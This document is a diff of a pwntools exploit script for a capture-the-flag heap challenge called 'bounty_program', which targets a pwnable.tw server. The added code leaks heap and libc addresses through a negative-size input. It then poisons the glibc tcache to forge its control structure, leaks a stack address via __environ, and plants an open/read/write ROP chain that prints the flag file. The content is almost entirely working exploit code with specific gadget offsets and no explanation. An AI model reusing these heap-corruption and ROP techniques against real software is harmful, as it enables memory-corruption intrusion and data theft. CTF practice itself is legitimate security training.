@@ -2,6 +2,10 @@
 
 from pwn import *
 import os
+import resource
+
+def set_limits():
+    resource.setrlimit(resource.RLIMIT_AS, (1 * 1024 * 1024 * 1024, 1 * 1024 * 1024 * 1024))
 
 sla = lambda p, d, x: p.sendlineafter(d, x)
 sa = lambda p, d, x: p.sendafter(d, x)
@@ -33,7 +37,7 @@ e = context.binary = ELF('./bounty_program_patched', checksec=False)
 libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so', checksec=False)
 ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
 
-TERMINAL = 3
+TERMINAL = 1
 USE_PTY = True
 GDB_ATTACH_DELAY = 1
 
@@ -48,16 +52,24 @@ match TERMINAL:
                             "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
     case _:
         raise ValueError(f"Unknown terminal: {TERMINAL}")
-
+        
 gdbscript = '''
 cd ''' + os.getcwd() + '''
 set solib-search-path ''' + os.getcwd() + '''
 set sysroot /
 set follow-fork-mode parent
 set detach-on-fork on
-brva 0x1601
-brva 0x15E9
-brva 0x20B7
+# brva 0x1601
+# brva 0x15E9
+# brva 0x20B7
+# brva 0x1434
+# brva 0x1355
+# brva 0x1652
+# brva 0x1555
+# brva 0x1B4A
+brva 0x1434
+# brva 0x1601
+# brva 0x183D
 continue
 '''
 
@@ -69,19 +81,46 @@ def attach(p):
 def conn():
     if args.LOCAL:
         env = os.environ.copy()
-        env["GLIBC_TUNABLES"] = "glibc.malloc.tcache_count=0"
+        # env["GLIBC_TUNABLES"] = "glibc.malloc.tcache_count=0"
         if USE_PTY:
-            p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY, env=env)
+            p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY, env=env, preexec_fn=set_limits)
         else:
-            p = process([e.path], env=env)
-        sleep(0.25)
-        attach(p)
+            p = process([e.path], env=env, preexec_fn=set_limits)
+        sleep(0.025)
         return p
     else:
-        host = "localhost"
-        port = 1337
+        host = "chall.pwnable.tw"
+        port = 10410
         return remote(host, port)
 
+class TcachePerthread:
+    MALLOC_ALIGNMENT = 0x10
+    MINSIZE = 0x20
+
+    def __init__(self):
+        self.num_slots = [0] * 64
+        self.entries = [0] * 64
+
+    @staticmethod
+    def size2idx(size):
+        return (size - TcachePerthread.MINSIZE) // TcachePerthread.MALLOC_ALIGNMENT
+
+    def set_count(self, size, count):
+        self.num_slots[self.size2idx(size)] = count
+        return self
+
+    def set_entry(self, size, ptr):
+        self.entries[self.size2idx(size)] = ptr
+        return self
+
+    def pack(self):
+        data = b''
+        for count in self.num_slots:
+            data += p8(count)
+        for entry in self.entries:
+            data += p64(entry)
+        return data
+    
 def Login(username, password):
     slan(p, b'choice', 1)
     sa(p, b'Username', username)
@@ -106,7 +145,8 @@ def AddVulnType(size, type, price):
     slan(p, b'choice', 2)
     slan(p, b'Size', size)
     sa(p, b'Type', type)
-    slan(p, b'Price', price)
+    if price != -1:
+        slan(p, b'Price', price)
     sleep(0.05)
 
 def SubmitBugReport(product_id, type_id, title, bug_id, desc_len, description):
@@ -158,43 +198,135 @@ while True:
     # Bounty
     slan(p, b'choice', 1)
 
-    # print("Leaking heap address")
-    # AddVulnType(0x70, b'A', 0)
-    # AddVulnType(0x70, b'B', 0)
-    # slan(p, b'choice', 2)
-    # slan(p, b'Size', -1)
-    # sa(p, b'Type', b'C')
-    # ru(p, b'type: ')
-    # heap_base = leak_bytes(b'\0' + rn(p, 5), 0x500)
-    # lg("heap base", heap_base)
+    print("Leaking heap address")
+    AddVulnType(0x240, b'A', 0)
+    AddVulnType(0x240, b'B', 0) # This only works since calloc skip tcache
+    slan(p, b'choice', 2)
+    slan(p, b'Size', -1)
+    sa(p, b'Type', b'0')
+    ru(p, b'type: ')
+    heap_base = leak_bytes(b'\0' + rn(p, 5), 0x500)
+    lg("heap base", heap_base)
 
-    # # Hoping for heap base address ends with 0x0000
-    # if heap_base & 0xffff != 0:
-    #     print("Failed attempt, we're unlucky this time")
-    #     p.close()
-    #     continue
+    # Hoping for heap base address ends with 0x0000
+    if heap_base & 0xffff != 0:
+        print("Failed attempt, we're unlucky this time")
+        p.close()
+        continue
+    
+    print("We're lucky this time")
 
-    # print("We're lucky this time")
-    AddNewProduct(b'iphone 18 pro max premium vip', b'4pple', b'A')
-    input()
-    SubmitBugReport(0, 0, b'A', 1, 0x12c00, b'A')
-    input()
-    AddVulnType(-1, b'A', 0)
-    # SubmitBugReport(0, 0, b'B', 2, 0, b'A')
+    print("Leaking libc address")
+    AddVulnType(0x420, b'C', 0)
+    slan(p, b'choice', 2)
+    slan(p, b'Size', -1)
+    sa(p, b'Type', b'0')
+    ru(p, b'type: ')
+    libc.address = leak_bytes(b'\0' + rn(p, 5), 0x3ec000)
+    lg("libc base", libc.address)
 
-    # RemoveVulnType(0x140, A(0x40))
-    # AddVulnType(0x40, )
-    # DeleteReport(0, 1)
-    # AddVulnType(0x1e8, A(0x100), 0)
-    # slan(p, b'choic,e', 2)
-    # input()
-    # slan(p, b'Size', 0xfffffff)
-    # sa(p, b'Type', b'F')
-    # ru(p, b'type: ')
-    # libc.address = leak_bytes(b'\0' + rn(p, 5), 0x3ebc00)
-    # lg("libc base", libc.address)
-    input()
+    RemoveVulnType(0x420, b'XSS')
+    RemoveVulnType(0x420, b'DoS')
+    RemoveVulnType(0x420, b'A')
+    RemoveVulnType(0x420, b'B')
+    RemoveVulnType(0x420, b'C')
 
-    ia(p)
+    # AddVulnType(0x420, b'A' * 0x5f, 0)
+    # AddVulnType(0x420, b'B' * 0x5f, 0)
+
+    AddNewProduct(b'iphone 18 pro max vip premium', b'4pple', b'A')
+    SubmitBugReport(0, 0, b'A', 0, 0x2000-0x130, b'A')
+
+    AddVulnType(0x420, A(0x210-1), 0) # clear unsortedbin
+
+    # tcache poisoning to control tcache
+    RemoveVulnType(0x240, b'A')
+    AddVulnType(0x240, b'\0', -1)
+    slan(p, b'choice', 2)
+    slan(p, b'Size', -1)
+    sa(p, b'Type', b'\0')
+    slan(p, b'Price', 0)
+
+
+    RemoveVulnType(0x420, A(0x210-1)) # remove 1 type for another
+    AddVulnType(0x420, A(0x23f), 0) # take 1 from tcache entry
+    AddVulnType(0x420, b'B' * 0x23f, 0) # take tcache address out
+    RemoveVulnType(0x420, b'B' * 0x23f) # put in unsortedbin
+
+    RemoveVulnType(0x420, b'RCE')
+    RemoveVulnType(0x420, A(0x23f))
+
+    tcache = TcachePerthread()
+    tcache.set_count(0x250, 0)
+    tcache.set_entry(0x20, heap_base + 0xce8) # bug description
+    AddVulnType(0x240, tcache.pack()[:0x23f], -1) # allocate again control whole tcache
+
+    AddVulnType(0x420, A(0x10) + p64(libc.symbols['__environ']), 0) # environ to bug description to leak stack
+
+    ShowBugDetail(0)
+
+    ru(p, b'Descripton > ')
+    stack = leak_bytes(rn(p, 6))
+    lg("stack", stack)
+
+    # control tcache again
+    AddVulnType(0x420, b'B' * 0x23f, 0)
+    RemoveVulnType(0x420, b'B' * 0x23f)
+
+    tcache = TcachePerthread()
+    tcache.set_count(0x250, 0)
+    tcache.set_entry(0x30, stack - 0x128)
+    tcache.set_entry(0x20, stack - 0x108)
+    AddVulnType(0x240, tcache.pack()[:0x23f], -1)
+
+    print("ORW ROP")
+    pop_rax = libc.address + 0x00000000000439c8
+    pop_rdi = libc.address + 0x000000000002155f
+    pop_rsi = libc.address + 0x0000000000023e6a
+    pop_rdx = libc.address + 0x0000000000001b96
+    pop_r10 = libc.address + 0x00000000001306b5
+    pop_r8_mov_eax_1 = libc.address + 0x0000000000155fc6
+    syscall = libc.address + 0x00000000000d2975
+    
+    flag_path = heap_base + 0x3260 + 0xd8
+    flag_buf = flag_path + 0x20
+
+    # ROP execveat() ko dc?? :v
+    ROP_chain = flat(
+        # open("/home/bounty_program/flag", 0, 0)
+        pop_rdi, flag_path,
+        pop_rsi, 0,
+        pop_rdx, 0,
+        pop_rax, 2,
+        syscall,
+
+        # read(4, buf, 0x100)
+        pop_rdi, 4, # 3 is /dev/urandom
+        pop_rsi, flag_buf,
+        pop_rdx, 0x100,
+        pop_rax, 0,
+        syscall,
+
+        # write(1, buf, 0x100)
+        pop_rdi, 1,
+        pop_rsi, flag_buf,
+        pop_rdx, 0x100,
+        pop_rax, 1,
+        syscall,
+
+        b'/home/bounty_program/flag\0'
+    )
+
+    SubmitBugReport(0, 0, b'A', 0, 0x100, ROP_chain)
+
+    attach(p)
+    sleep(0.5)
+    AddVulnType(0x420, p64(heap_base + 0x3260),0)
+
+    AddVulnType(0x420, A(24) + p64(libc.address + 0x000000000011bd7c),0)
+
+    slan(p, b'Your choice', 0)
+
+    print(ra(p, 2))
     p.close()
     break
